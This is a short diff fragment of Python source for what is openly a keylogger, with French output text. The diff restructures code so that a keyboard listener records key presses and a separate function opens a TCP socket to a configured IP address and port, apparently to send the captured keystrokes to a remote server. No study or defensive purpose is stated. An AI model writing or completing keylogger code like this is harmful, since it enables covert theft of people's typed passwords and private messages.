@@ -35,10 +35,10 @@ def start_keylogger():
         except Exception as e:
             print(f"Erreur de keylogger : {e}")
 
-def connect_to_server():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
+def connect_to_server():
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cs.connect((ip_address, port_number))
 
